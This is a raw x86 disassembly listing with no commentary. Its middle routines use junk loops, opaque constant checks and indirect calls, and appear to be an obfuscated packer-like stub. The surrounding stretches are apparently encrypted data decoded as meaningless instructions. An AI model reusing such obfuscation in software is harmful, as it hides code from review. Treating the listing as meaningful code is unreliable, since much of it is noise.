  40f1a5:	mov    ebp,0x6ad6a103
  40f1aa:	or     esp,DWORD PTR ds:0x410674a1
  40f1b0:	push   0xffffffb5
  40f1b2:	enter  0x5a92,0xca
  40f1b6:	cmp    bl,BYTE PTR [ebx+0x14]
  40f1b9:	rcl    BYTE PTR [ebp-0x23],0x74
  40f1bd:	sub    eax,0xc211ae69
  40f1c2:	outs   dx,BYTE PTR ds:[esi]
  40f1c3:	outs   dx,DWORD PTR ds:[esi]
  40f1c4:	inc    edi
  40f1c5:	hlt    
  40f1c6:	jo     0x40f216
  40f1c8:	push   ss
  40f1c9:	mov    bh,0x8b
  40f1cb:	shr    BYTE PTR [ebx+0x59],1
  40f1ce:	stos   BYTE PTR es:[edi],al
  40f1cf:	pop    DWORD PTR [ebx]
  40f1d1:	dec    ebx
  40f1d2:	aaa    
  40f1d3:	call   0x62e8be68
  40f1d8:	sbb    eax,0xc2356f2e
  40f1dd:	out    0xce,al
  40f1df:	inc    esi
  40f1e0:	loop   0x40f1a2
  40f1e2:	(bad)
  40f1e5:	mov    BYTE PTR [edi],ah
  40f1e7:	popf   
  40f1e8:	pop    ebx
  40f1e9:	repz add eax,0xac193cb6
  40f1ef:	out    dx,eax
  40f1f0:	(bad)  
  40f1f1:	fdiv   QWORD PTR [eax+eax*4+0x7c]
  40f1f5:	rcr    BYTE PTR [eax-0x6e4a1107],0x42
  40f1fc:	out    dx,eax
  40f1fd:	sub    dh,BYTE PTR [ebx+0x51]
  40f200:	aas    
  40f201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f202:	lahf   
  40f203:	daa    
  40f204:	xor    bh,BYTE PTR [eax]
  40f206:	pop    ebp
  40f207:	add    ebp,edx
  40f209:	stos   DWORD PTR es:[edi],eax
  40f20a:	shr    DWORD PTR [edx-0x1c],1
  40f20d:	loop   0x40f23e
  40f20f:	ret    0xc81b
  40f212:	dec    esp
  40f213:	ins    DWORD PTR es:[edi],dx
  40f214:	adc    eax,0xa8ce2604
  40f219:	mov    esi,0xb604e
  40f21e:	push   ebx
  40f21f:	pop    ss
  40f220:	fwait
  40f221:	cwde   
  40f222:	lock push ecx
  40f224:	sub    ah,bh
  40f226:	sub    ah,ch
  40f228:	inc    eax
  40f229:	mov    eax,ds:0x17fdadc
  40f22e:	std    
  40f22f:	outs   dx,BYTE PTR ds:[esi]
  40f230:	sbb    DWORD PTR [ebx+0x7746c596],eax
  40f236:	mul    DWORD PTR [edi+esi*2]
  40f239:	xor    esi,DWORD PTR [ebp+0x50816f74]
  40f23f:	and    edi,DWORD PTR [ebp+0x15815785]
  40f245:	xlat   BYTE PTR ds:[ebx]
  40f246:	test   DWORD PTR [edx+0x0],eax
  40f249:	scas   al,BYTE PTR es:[edi]
  40f24a:	jp     0x40f24c
  40f24c:	add    BYTE PTR [ebx-0x31fcef83],cl
  40f252:	mov    DWORD PTR ds:0x4285ff,0x246a
  40f25c:	cmp    ecx,edi
  40f25e:	mov    DWORD PTR ds:0x428627,0x3e93
  40f268:	je     0x40f379
  40f26e:	xor    edi,edi
  40f270:	mov    ecx,DWORD PTR [ebp-0x4]
  40f273:	not    edi
  40f275:	mov    edi,DWORD PTR [ebp+0x10]
  40f278:	sub    DWORD PTR ds:0x42863f,0x4adb
  40f282:	xor    eax,eax
  40f284:	adc    DWORD PTR ds:0x42865f,0x6085
  40f28e:	xor    ecx,edx
  40f290:	xor    DWORD PTR ds:0x42860b,0x42862f
  40f29a:	add    ecx,esi
  40f29c:	xor    DWORD PTR ds:0x4285d7,0x24ca
  40f2a6:	add    edi,0xfabdbedd
  40f2ac:	not    DWORD PTR ds:0x428617
  40f2b2:	adc    eax,0xffffffff
  40f2b5:	xor    eax,0x0
  40f2b8:	and    DWORD PTR ds:0x428663,0x428617
  40f2c2:	mov    DWORD PTR [ebp-0xc],eax
  40f2c5:	or     DWORD PTR ds:0x42866f,0x42864f
  40f2cf:	push   ebx
  40f2d0:	add    DWORD PTR ds:0x428647,ecx
  40f2d6:	xor    ebx,ebx
  40f2d8:	xor    edi,0x8a29a137
  40f2de:	mov    eax,ecx
  40f2e0:	add    eax,0xfabdbedd
  40f2e5:	adc    ebx,0xffffffff
  40f2e8:	xor    eax,0x8a29a137
  40f2ed:	xor    ebx,0x0
  40f2f0:	cmp    eax,edi
  40f2f2:	jne    0x40f30b
  40f2f8:	cmp    ebx,DWORD PTR [ebp-0xc]
  40f2fb:	je     0x40f373
  40f301:	jmp    0x40f30b
  40f306:	mov    esi,0x3272ec
  40f30b:	mov    eax,DWORD PTR [ebp-0x4]
  40f30e:	mov    edi,DWORD PTR [ebp-0x8]
  40f311:	xor    edi,edx
  40f313:	add    edi,esi
  40f315:	mov    esi,DWORD PTR [ebp+0x8]
  40f318:	imul   edi,ecx
  40f31b:	mov    ebx,DWORD PTR [ebp+0xc]
  40f31e:	xor    eax,edx
  40f320:	add    eax,ecx
  40f322:	mov    al,BYTE PTR [ebx+eax*1+0x3272ec]
  40f329:	mov    BYTE PTR [edi+esi*1],al
  40f32c:	mov    eax,DWORD PTR [ebp-0x8]
  40f32f:	mov    esi,DWORD PTR [ebp+0x10]
  40f332:	xor    eax,edx
  40f334:	xor    ebx,ebx
  40f336:	add    esi,0xfabdbedd
  40f33c:	adc    ebx,0xffffffff
  40f33f:	lea    ecx,[ecx+eax*1+0x3272ec]
  40f346:	xor    edi,edi
  40f348:	xor    esi,0x8a29a137
  40f34e:	xor    ebx,0x0
  40f351:	mov    eax,ecx
  40f353:	add    eax,0xfabdbedd
  40f358:	adc    edi,0xffffffff
  40f35b:	xor    eax,0x8a29a137
  40f360:	xor    edi,0x0
  40f363:	cmp    eax,esi
  40f365:	jne    0x40f306
  40f36b:	cmp    edi,ebx
  40f36d:	jne    0x40f306
  40f373:	mov    eax,0xf89c85b1
  40f378:	pop    ebx
  40f379:	pop    edi
  40f37a:	pop    esi
  40f37b:	leave  
  40f37c:	ret    0xc
  40f37f:	push   ebp
  40f380:	mov    ebp,esp
  40f382:	push   ecx
  40f383:	xor    DWORD PTR ds:0x428677,0x1e97
  40f38d:	mov    DWORD PTR [ebp-0x4],0xf89c85bc
  40f394:	dec    edx
  40f395:	mov    eax,DWORD PTR [ebp-0x4]
  40f398:	or     DWORD PTR ds:0x42862f,0x2902
  40f3a2:	mov    edx,DWORD PTR [ebp+0x10]
  40f3a5:	mov    ecx,0x75108a4
  40f3aa:	adc    DWORD PTR ds:0x428677,0x428657
  40f3b4:	xor    eax,ecx
  40f3b6:	add    eax,0x3272ec
  40f3bb:	or     DWORD PTR ds:0x42866b,0x4f38
  40f3c5:	mov    DWORD PTR [edx],eax
  40f3c7:	and    DWORD PTR ds:0x428603,0x0
  40f3d1:	jmp    0x40f3e1
  40f3d6:	mov    eax,ds:0x428603
  40f3db:	inc    eax
  40f3dc:	mov    ds:0x428603,eax
  40f3e1:	cmp    DWORD PTR ds:0x428603,0x17
  40f3e8:	jae    0x40f42d
  40f3ee:	cmp    DWORD PTR ds:0x428603,0x5
  40f3f5:	jge    0x40f42d
  40f3fb:	jmp    0x40f410
  40f400:	push   0x8c16
  40f405:	push   0x428617
  40f40a:	call   DWORD PTR ds:0x4287b3
  40f410:	cmp    DWORD PTR ds:0x428603,0x4
  40f417:	jne    0x40f428
  40f41d:	mov    eax,ds:0x428603
  40f422:	inc    eax
  40f423:	mov    ds:0x428603,eax
  40f428:	jmp    0x40f3d6
  40f42d:	mov    eax,DWORD PTR [ebp+0xc]
  40f430:	xor    eax,ecx
  40f432:	push   esi
  40f433:	mov    esi,DWORD PTR [ebp+0x10]
  40f436:	mov    edx,0x3272ec
  40f43b:	add    eax,edx
  40f43d:	mov    DWORD PTR [esi+0x4],eax
  40f440:	mov    eax,DWORD PTR [ebp+0x14]
  40f443:	mov    esi,DWORD PTR [ebp+0x10]
  40f446:	mov    DWORD PTR [esi+0x8],eax
  40f449:	mov    eax,DWORD PTR [ebp+0x18]
  40f44c:	mov    esi,DWORD PTR [ebp+0x10]
  40f44f:	mov    DWORD PTR [esi+0xc],eax
  40f452:	mov    eax,DWORD PTR [ebp+0x1c]
  40f455:	mov    esi,DWORD PTR [ebp+0x10]
  40f458:	mov    DWORD PTR [esi+0x10],eax
  40f45b:	mov    eax,DWORD PTR [ebp+0x8]
  40f45e:	xor    eax,ecx
  40f460:	add    eax,edx
  40f462:	pop    esi
  40f463:	leave  
  40f464:	ret    0x18
  40f467:	push   ebp
  40f468:	mov    ebp,esp
  40f46a:	sub    esp,0x9c
  40f470:	dec    ecx
  40f471:	mov    ecx,DWORD PTR [ebp+0x8]
  40f474:	mov    eax,0x8a94
  40f479:	sbb    DWORD PTR ds:0x428677,0x4285eb
  40f483:	xor    ax,WORD PTR [ecx+0x20]
  40f487:	mov    ecx,DWORD PTR ds:0x42864b
  40f48d:	sub    ecx,DWORD PTR ds:0x428673
  40f493:	mov    DWORD PTR ds:0x42864b,ecx
  40f499:	mov    ecx,0x3b56
  40f49e:	add    ax,cx
  40f4a1:	movzx  eax,ax
  40f4a4:	and    DWORD PTR ds:0x42865f,0x0
  40f4ae:	jmp    0x40f4c0
  40f4b3:	mov    ecx,DWORD PTR ds:0x42865f
  40f4b9:	inc    ecx
  40f4ba:	mov    DWORD PTR ds:0x42865f,ecx
  40f4c0:	cmp    DWORD PTR ds:0x42865f,0x11
  40f4c7:	jae    0x40f4ea
  40f4cd:	cmp    DWORD PTR ds:0x42865f,0x17
  40f4d4:	jge    0x40f4ea
  40f4da:	jmp    0x40f4e5
  40f4df:	call   DWORD PTR ds:0x4287b7
  40f4e5:	jmp    0x40f4b3
  40f4ea:	mov    DWORD PTR [ebp-0x10],eax
  40f4ed:	mov    BYTE PTR [ebp-0x1],0x7d
  40f4f1:	and    DWORD PTR ds:0x42863b,0x0
  40f4fb:	jmp    0x40f50d
  40f500:	mov    ecx,DWORD PTR ds:0x42863b
  40f506:	inc    ecx
  40f507:	mov    DWORD PTR ds:0x42863b,ecx
  40f50d:	cmp    DWORD PTR ds:0x42863b,0x11
  40f514:	jae    0x40f53a
  40f51a:	cmp    DWORD PTR ds:0x42863b,0x14
  40f521:	jg     0x40f53a
  40f527:	jmp    0x40f535
  40f52c:	push   DWORD PTR [ebp-0x1c]
  40f52f:	call   DWORD PTR ds:0x4287bb
  40f535:	jmp    0x40f500
  40f53a:	lea    eax,[ebp-0x1]
  40f53d:	xor    DWORD PTR ds:0x4285d7,0x262c
  40f547:	mov    DWORD PTR [ebp-0xc],eax
  40f54a:	inc    ecx
  40f54b:	mov    al,BYTE PTR [ebp-0x1]
  40f54e:	mov    ecx,DWORD PTR [ebp-0xc]
  40f551:	xor    al,0x79
  40f553:	sub    al,0x3
  40f555:	mov    BYTE PTR [ecx],al
  40f557:	mov    DWORD PTR [ebp-0x18],0xf89c85b0
  40f55e:	mov    eax,ds:0x428697
  40f563:	mov    ecx,DWORD PTR ds:0x4286db
  40f569:	sub    ecx,eax
  40f56b:	add    eax,DWORD PTR [eax+ecx*1]
  40f56e:	push   ebx
  40f56f:	and    DWORD PTR ds:0x428603,0x0
  40f579:	jmp    0x40f58c
  40f57e:	xor    eax,eax
  40f580:	add    eax,DWORD PTR ds:0x428603
  40f586:	inc    eax
  40f587:	mov    ds:0x428603,eax
  40f58c:	cmp    DWORD PTR ds:0x428603,0x10
  40f593:	jae    0x40f5e9
  40f599:	cmp    DWORD PTR ds:0x428603,0x7
  40f5a0:	jle    0x40f5e9
  40f5a6:	jmp    0x40f5c9
  40f5ab:	push   DWORD PTR [ebp-0x28]
  40f5ae:	push   0x428034
  40f5b3:	push   DWORD PTR [ebp-0x18]
  40f5b6:	push   0x428079
  40f5bb:	push   0x5a9e
  40f5c0:	push   DWORD PTR [ebp-0x14]
  40f5c3:	call   DWORD PTR ds:0x4287bf
  40f5c9:	cmp    DWORD PTR ds:0x428603,0x6
  40f5d0:	jne    0x40f5e4
  40f5d6:	xor    eax,eax
  40f5d8:	xor    eax,DWORD PTR ds:0x428603
  40f5de:	inc    eax
  40f5df:	mov    ds:0x428603,eax
  40f5e4:	jmp    0x40f57e
  40f5e9:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  40f5f0:	sbb    DWORD PTR ds:0x42861b,ecx
  40f5f6:	mov    ecx,DWORD PTR [ebp-0x18]
  40f5f9:	push   esi
  40f5fa:	mov    eax,0x75108a4
  40f5ff:	xor    esi,esi
  40f601:	or     esi,DWORD PTR ds:0x42869f
  40f607:	mov    esi,DWORD PTR [esi]
  40f609:	or     DWORD PTR ds:0x428633,esi
  40f60f:	xor    ecx,eax
  40f611:	xor    DWORD PTR ds:0x428613,ebx
  40f617:	mov    esi,0x3272ec
  40f61c:	push   edi
  40f61d:	or     DWORD PTR ds:0x4285ef,0x42867b
  40f627:	add    ecx,esi
  40f629:	mov    DWORD PTR ds:0x42867b,0x3def
  40f633:	jmp    0x40f64d
  40f638:	mov    DWORD PTR ds:0x428633,0x70a7
  40f642:	mov    dl,BYTE PTR [ebp-0x1]
  40f645:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40f64c:	inc    ecx
  40f64d:	mov    DWORD PTR ds:0x4285ef,0x74bd
  40f657:	cmp    ecx,0x40
  40f65a:	mov    DWORD PTR ds:0x42865f,0x4046
  40f664:	jb     0x40f638
  40f66a:	adc    edx,0xe49
  40f670:	mov    edx,DWORD PTR [ebp-0x18]
  40f673:	xor    edx,eax
  40f675:	sub    DWORD PTR ds:0x4285d3,0x203c
  40f67f:	add    edx,esi
  40f681:	jmp    0x411adf
  40f686:	mov    edi,DWORD PTR [ebp+0x8]
  40f689:	jmp    0x411a2a
  40f68e:	sub    ah,al
  40f690:	xor    al,0xf6
  40f692:	test   al,0xa6
  40f694:	mov    al,ds:0x7e506298
  40f699:	mov    esp,DWORD PTR [edi+0x422cbb49]
  40f69f:	mov    eax,ds:0x5ffe7a7a
  40f6a4:	jp     0x40f720
  40f6a6:	leave  
  40f6a7:	cmp    al,0x16
  40f6a9:	cmp    eax,0xb2cd9573
  40f6ae:	out    0xaf,al
  40f6b0:	hlt    
  40f6b1:	adc    DWORD PTR [ebx+0x4d],esp
  40f6b4:	jg     0x40f726
  40f6b6:	scas   eax,DWORD PTR es:[edi]
  40f6b7:	dec    ebp
  40f6b8:	int    0x4e
  40f6ba:	sub    al,0xca
  40f6bc:	call   0x338eb534
  40f6c1:	fs jo  0x40f64a
  40f6c4:	ret    0x2d6b
  40f6c7:	mov    ds,WORD PTR [eax]
  40f6c9:	arpl   WORD PTR [esi],ax
  40f6cb:	jle    0x40f6b7
  40f6cd:	xchg   ebp,eax
  40f6ce:	js     0x40f6d3
  40f6d0:	adc    DWORD PTR [esi+ecx*1],eax
  40f6d3:	inc    eax
  40f6d4:	in     al,dx
  40f6d5:	sbb    al,0x5
  40f6d7:	and    DWORD PTR [esi-0x21],0x77f640e4
  40f6de:	sbb    edx,DWORD PTR [edi+0x4db1d586]
  40f6e4:	das    
  40f6e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6e6:	inc    esp
  40f6e7:	lods   al,BYTE PTR ds:[esi]
  40f6e8:	dec    esp
  40f6e9:	pop    eax
  40f6ea:	jg     0x40f68b
  40f6ec:	push   eax
  40f6ed:	mov    bl,0x93
  40f6ef:	(bad)  
  40f6f0:	outs   dx,DWORD PTR ds:[esi]
  40f6f1:	push   edi
  40f6f2:	retf   
  40f6f3:	push   0x49
  40f6f5:	not    eax
  40f6f7:	add    edi,DWORD PTR [esi-0x4c767d3]
  40f6fd:	xor    ebx,DWORD PTR [ecx-0x2b]
  40f700:	imul   esi,DWORD PTR [ecx+0x6f990479],0x71
  40f707:	arpl   WORD PTR [eax+0x48],di
  40f70a:	lods   al,BYTE PTR ds:[esi]
  40f70b:	in     eax,0x2e
  40f70d:	xor    al,0xc2
  40f70f:	xchg   edi,eax
  40f710:	int    0x9c
  40f712:	sbb    eax,0xc015d83d
  40f717:	xchg   ecx,eax
  40f718:	adc    BYTE PTR [edx*2+0x667f8b92],dl
  40f71f:	and    cl,BYTE PTR [ebp+0x6]
  40f722:	adc    eax,0x92f2a6c5
  40f728:	ds rcr edx,1
  40f72b:	cmp    BYTE PTR [eax+0x58005f09],bl
  40f731:	inc    ecx
  40f732:	inc    eax
  40f733:	and    esp,DWORD PTR [ecx]
  40f735:	sbb    edi,DWORD PTR [ebx]
  40f737:	push   eax
  40f738:	push   0xffffff84
  40f73a:	push   ds
  40f73b:	mov    ds:0x5c61b208,eax
  40f740:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f741:	xchg   esi,eax
  40f742:	cmp    eax,0xbe8fa814
  40f747:	and    DWORD PTR [edx-0x59],ebx
  40f74a:	shl    ebp,cl
  40f74c:	cmp    ch,BYTE PTR [edi]
  40f74e:	push   ds
  40f74f:	dec    ebx
  40f750:	ror    BYTE PTR [edi-0x22],0xa0
  40f754:	out    dx,al
  40f755:	test   eax,0x4a6000b6
  40f75a:	fist   WORD PTR [ebp+0x5069541d]
  40f760:	sbb    DWORD PTR [eax],0x5c2e2709
  40f766:	lds    eax,FWORD PTR [edi+0x16748fd]
  40f76c:	push   0x1a35b59c
  40f771:	jnp    0x40f7e7
  40f773:	mov    esp,0x806c8951
  40f778:	mov    WORD PTR [ebp-0x5],fs
  40f77b:	jge    0x40f7a7
  40f77d:	mov    edi,0xb55ee40d
  40f782:	aas    
  40f783:	sub    bh,dl
  40f785:	cmp    BYTE PTR [ebx],ch
  40f787:	mov    ecx,0xff76b79a
  40f78c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f78d:	inc    ecx
  40f78e:	mov    al,0xe6
  40f790:	sub    DWORD PTR [ecx-0x5d86fbcb],esp
  40f796:	(bad)  [ecx-0x40]
  40f799:	jne    0x40f736
  40f79b:	add    edi,ebp
  40f79d:	push   eax
  40f79e:	lea    edx,[ebp+0x29]
  40f7a1:	mov    ch,0x6e
  40f7a3:	pop    ebp
  40f7a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7a5:	push   cs
  40f7a6:	loope  0x40f72c
  40f7a8:	not    BYTE PTR [eax-0x1cc283c9]
  40f7ae:	into   
  40f7af:	cmp    esp,DWORD PTR [ebx+ebp*8-0x5914df81]
  40f7b6:	in     al,0x89
  40f7b8:	mov    ebx,0x137d517d
  40f7bd:	fld    TBYTE PTR [esi+eax*1]
  40f7c0:	cld    
  40f7c1:	clc    
  40f7c2:	ins    BYTE PTR es:[edi],dx
  40f7c3:	shl    dl,cl
  40f7c5:	gs mov dh,0xa8
  40f7c8:	xchg   ebx,eax
  40f7c9:	out    0x36,al
  40f7cb:	fnstenv [ebp-0x48d5e1c6]
  40f7d1:	ror    DWORD PTR [eax+ecx*4-0x7976c27a],0x7f
  40f7d9:	fcom   DWORD PTR [ebp-0x3e31a655]
  40f7df:	xchg   BYTE PTR [edx],dl
  40f7e1:	xor    bl,BYTE PTR [esi-0x3a]
  40f7e4:	push   edx
  40f7e5:	pusha  
  40f7e6:	and    esp,DWORD PTR ds:0xba4cac58
  40f7ec:	sub    edi,ebx
  40f7ee:	jmp    0x40f7e6
  40f7f0:	test   eax,0x26d156f8
  40f7f5:	sub    eax,0x7e114c6f
  40f7fa:	mov    BYTE PTR [ecx+0x648c7469],ah
  40f800:	xchg   ebx,eax
  40f801:	lods   eax,DWORD PTR ds:[esi]
  40f802:	mov    esp,0x2b55bea0
  40f807:	pushf  
  40f808:	jae    0x40f83a
  40f80a:	mov    esp,edi
  40f80c:	or     dh,dl
  40f80e:	enter  0x4699,0x3f
  40f812:	pop    esi
  40f813:	in     al,0x71
  40f815:	sbb    al,0x1b
  40f817:	pop    ebx
  40f818:	sahf   
  40f819:	mov    edx,0x3040aba8
  40f81e:	and    al,0x9a
  40f820:	std    
  40f821:	sub    BYTE PTR [edx+0x1f],ch
  40f824:	(bad)  
  40f826:	sub    al,0x1e
  40f828:	shl    BYTE PTR [edx-0x638e1e72],cl
  40f82e:	mov    BYTE PTR [edi-0x167d932c],bh
  40f834:	jns    0x40f8b4
  40f836:	call   0x4c77:0xaf497438
  40f83d:	fsubr  QWORD PTR [ebx+0x59]
  40f840:	push   es
  40f841:	cmp    ebp,DWORD PTR [edx]
  40f843:	pop    edx
  40f844:	dec    esi
  40f845:	pop    ecx
  40f846:	fisttp WORD PTR [edi]
  40f848:	mov    esp,ecx
  40f84a:	xchg   DWORD PTR ds:0xae03db19,eax
  40f850:	mov    al,ds:0x3b4cf78e
  40f855:	sub    al,0xc5
  40f857:	xchg   edi,eax
  40f858:	ins    DWORD PTR es:[edi],dx
  40f859:	mov    esp,0x70508bed
  40f85e:	push   esp
  40f85f:	ret    
  40f860:	xor    al,0x5c
  40f862:	mov    ch,0xad
  40f864:	(bad)  
  40f865:	addr16 sbb al,dl
  40f868:	xlat   BYTE PTR ds:[ebx]
  40f869:	cmp    ch,BYTE PTR [edx+ecx*4-0x142c7539]
  40f870:	cmp    al,0x1c
  40f872:	adc    edi,DWORD PTR [ebp+0x56]
  40f875:	iret   
  40f876:	pop    edx
  40f877:	rol    DWORD PTR [eax-0xd],0xe0
  40f87b:	cmc    
  40f87c:	xor    eax,0x3b350f1c
  40f881:	pop    ds
  40f882:	jmp    0x40f859
  40f884:	jne    0x40f82a
  40f886:	retf   0xa17e
  40f889:	jg     0x40f8e0
  40f88b:	cdq    
  40f88c:	test   eax,0xd60e2c83
  40f891:	ret    
  40f892:	lods   al,BYTE PTR ds:[esi]
  40f893:	cs cld 
  40f895:	inc    eax
  40f896:	int    0x77
  40f898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f899:	xchg   al,bh
  40f89b:	fsubp  st(5),st
  40f89d:	mov    bl,0x2c
  40f89f:	mov    edi,fs
  40f8a1:	mov    al,0x94
  40f8a3:	lds    esi,FWORD PTR [edi+eax*1+0x7ed20d3f]
  40f8aa:	xchg   ebx,eax
  40f8ab:	mov    eax,0x7e02e7dc
  40f8b0:	or     esp,DWORD PTR [ecx+0x6a2fa2d]
  40f8b6:	fwait
  40f8b7:	xor    eax,0x2b3b06b7
  40f8bc:	add    eax,0x92988c31
  40f8c1:	jp     0x40f851
  40f8c3:	fdiv   st,st(0)
  40f8c5:	sub    dh,BYTE PTR [esi+0x63aafe1c]
  40f8cb:	cmp    dh,BYTE PTR [ecx+edx*2-0x911473b]
  40f8d2:	xchg   edx,eax
  40f8d3:	in     eax,0xb7
  40f8d5:	daa    
  40f8d6:	in     eax,dx
  40f8d7:	jae    0x40f926
  40f8d9:	and    esp,DWORD PTR [edx]
  40f8db:	in     eax,0x54
  40f8dd:	pop    es
  40f8de:	out    dx,al
  40f8df:	into   
  40f8e0:	mov    al,0x32
  40f8e2:	icebp  
  40f8e3:	jmp    0x40f87c
  40f8e5:	sbb    BYTE PTR [eax-0x2f],dh
  40f8e8:	cmp    ah,dl
  40f8ea:	test   BYTE PTR [ebx-0x68],ch
  40f8ed:	xchg   edi,eax
  40f8ee:	mov    BYTE PTR [ebx+0x51a1eb1e],ah
  40f8f4:	cdq    
  40f8f5:	jns    0x40f884
  40f8f7:	jp     0x40f904
  40f8f9:	inc    edx
  40f8fa:	pop    ds
  40f8fb:	mov    esp,0x75f6616a
  40f900:	inc    ecx
  40f901:	inc    ecx
  40f902:	jbe    0x40f884
  40f904:	mov    al,dh
  40f906:	mov    esi,0xed1e2f08
  40f90b:	or     BYTE PTR [esi-0x69b165c4],bl
  40f911:	mov    bl,0x3e
  40f913:	xlat   BYTE PTR ds:[ebx]
  40f914:	jnp    0x40f8bc
  40f916:	rcr    BYTE PTR [edx-0x60],cl
  40f919:	xchg   esi,eax
  40f91a:	popa   
  40f91b:	push   edx
  40f91c:	ret    0x7d38
  40f91f:	out    dx,al
  40f920:	mov    cl,0x5a
  40f922:	mov    cl,dh
  40f924:	jge    0x40f8ff
  40f926:	scas   eax,DWORD PTR es:[edi]
  40f927:	cmp    dl,0xd0
  40f92a:	xor    DWORD PTR [edx-0x1b48b863],esi
  40f930:	pop    ebp
  40f931:	jnp    0x40f8b7
  40f933:	xchg   DWORD PTR [esi+0x2d],edx
  40f936:	adc    BYTE PTR [edx+0x17],0x67
  40f93a:	add    DWORD PTR [eax-0x8],ebx
  40f93d:	jp     0x40f996
  40f93f:	xor    eax,0x6a59f443
  40f944:	mov    eax,0xee1ee8cd
  40f949:	outs   dx,BYTE PTR ds:[esi]
  40f94a:	mov    edx,0x701c7b07
  40f94f:	rcr    BYTE PTR [eax+0x5a],0xbd
  40f953:	arpl   WORD PTR [edi],di
  40f955:	mov    edx,0x4ad81e32
  40f95a:	xor    DWORD PTR [ebp-0x1f],0xef4e0668
  40f961:	shl    al,cl
  40f963:	test   al,0x75
  40f965:	sub    DWORD PTR [ebx+0x204a1436],esp
  40f96b:	jb     0x40f9a7
  40f96d:	(bad)  
  40f96e:	stc    
  40f96f:	jmp    0xc5a0107a
  40f974:	stos   DWORD PTR es:[edi],eax
  40f975:	cli    
  40f976:	leave  
  40f977:	scas   al,BYTE PTR es:[edi]
  40f978:	mov    edi,0x4aaca0de
  40f97d:	enter  0x2f0e,0x73
  40f981:	adc    bl,BYTE PTR [ecx+0x6]
  40f984:	or     DWORD PTR [ebx-0x38ca2519],edx
  40f98a:	sbb    eax,0x96891bc0
  40f98f:	push   cs
  40f990:	test   DWORD PTR [ebp+0x33],ecx
  40f993:	imul   esp,DWORD PTR [eax-0x34b1ffb9],0x145a2191
  40f99d:	pop    esi
  40f99e:	xchg   ebx,eax
  40f99f:	(bad)  
  40f9a0:	dec    esi
  40f9a1:	popf   
  40f9a2:	and    al,0x6e
  40f9a4:	ins    BYTE PTR es:[edi],dx
  40f9a5:	int3   
  40f9a6:	(bad)
  40f9a9:	adc    BYTE PTR [ecx-0x13],0x3
  40f9ad:	inc    edi
  40f9ae:	(bad)
  40f9b1:	mov    dl,0x96
  40f9b3:	mov    ss,WORD PTR [esi+0x4b74b813]
  40f9b9:	jnp    0x40f9fd
  40f9bb:	pop    esi
  40f9bc:	jmp    0xa6c8844f
  40f9c1:	mov    esi,0xc5745018
  40f9c6:	jmp    0x40f975
  40f9c8:	std    
  40f9c9:	lods   al,BYTE PTR ds:[esi]
  40f9ca:	push   ss
  40f9cb:	loope  0x40f9b4
  40f9cd:	out    dx,al
  40f9ce:	pop    ebx
  40f9cf:	ror    DWORD PTR [ecx-0x38a38190],cl
  40f9d5:	loop   0x40f9e4
  40f9d7:	imul   edi,DWORD PTR [edi+eax*4-0x9],0xf859dcba
  40f9df:	scas   eax,DWORD PTR es:[edi]
  40f9e0:	bswap  edx
  40f9e2:	call   0x9fd3:0x67a73b95
  40f9e9:	adc    eax,0x3e47672a
  40f9ee:	mov    eax,ds:0xa18e704b
  40f9f3:	add    BYTE PTR [ebx+0x61],dl
  40f9f6:	cwde   
  40f9f7:	outs   dx,BYTE PTR ds:[esi]
  40f9f8:	cmp    ebx,DWORD PTR [edi-0x79]
  40f9fb:	lds    edx,FWORD PTR [ebx]
  40f9fd:	sub    esp,esp
  40f9ff:	out    0x34,al
  40fa01:	jno    0x40f99c
  40fa03:	jmp    0x40f9ca
  40fa05:	inc    esi
  40fa06:	xchg   edx,eax
  40fa07:	(bad)  
  40fa08:	daa    
  40fa09:	mov    al,ds:0x498214b9
  40fa0e:	cwde   
  40fa0f:	xchg   edx,eax
  40fa10:	fxch   st(6)
  40fa12:	test   DWORD PTR ds:[ebx-0x79],eax
  40fa16:	xlat   BYTE PTR ds:[ebx]
  40fa17:	aad    0x1d
  40fa19:	mov    bl,0x74
  40fa1b:	jbe    0x40fa10
  40fa1d:	sbb    dh,BYTE PTR [ebp+0x6a]
  40fa20:	mov    ch,0x3a
  40fa22:	(bad)  
  40fa24:	mov    dh,0x2b
  40fa26:	shl    DWORD PTR [ebp+ebp*4+0x2a],cl
  40fa2a:	jnp    0x40fa25
  40fa2c:	pop    ds
  40fa2d:	jl     0x40f9c8
  40fa2f:	cs call 0xeb006458
  40fa35:	pop    esi
  40fa36:	lock aad 0x6f
  40fa39:	cmp    DWORD PTR [edi],esi
  40fa3b:	inc    ecx
  40fa3d:	in     eax,0x62
  40fa3f:	imul   ebx,DWORD PTR [esi+0x3],0xdbbabca2
  40fa46:	(bad)  
  40fa47:	sbb    eax,0xa7e67aec
  40fa4c:	adc    edi,DWORD PTR [ebx]
  40fa4e:	cmp    eax,0x80f466a
  40fa53:	jb     0x40fa49
  40fa55:	(bad)  
  40fa56:	into   
  40fa57:	cmp    DWORD PTR [ebx+0x31],0x29dcbb9f
  40fa5e:	div    DWORD PTR [esi-0x3d2f8111]
  40fa64:	xchg   esi,eax
  40fa65:	push   ecx
  40fa66:	fldenv [edi]
  40fa68:	and    BYTE PTR [esi+0x32],dl
  40fa6b:	or     bh,BYTE PTR [ecx]
  40fa6d:	cld    
  40fa6e:	mov    esp,0x52c796ad
  40fa73:	in     eax,dx
  40fa74:	xchg   ebp,eax
  40fa75:	add    edx,DWORD PTR [ecx]
  40fa77:	rol    edx,0x36
  40fa7a:	int    0xcb
  40fa7c:	dec    edx
  40fa7d:	sahf   
  40fa7e:	int3   
  40fa7f:	test   dh,ch
  40fa81:	xor    BYTE PTR [edi-0x32],al
  40fa84:	popa   
  40fa85:	and    esi,ecx
  40fa87:	dec    esi
  40fa88:	sar    DWORD PTR [edx],1
  40fa8a:	je     0x40fa0f
  40fa8c:	mov    bh,0x2d
  40fa8e:	shr    esp,cl
  40fa90:	pop    eax
  40fa91:	retf   
  40fa92:	and    al,0xd4
  40fa94:	sti    
  40fa95:	and    BYTE PTR [ecx+0x56],bh
  40fa98:	test   eax,0x2b5b614b
  40fa9d:	(bad)  
  40fa9e:	aad    0x1b
  40faa0:	xlat   BYTE PTR ds:[ebx]
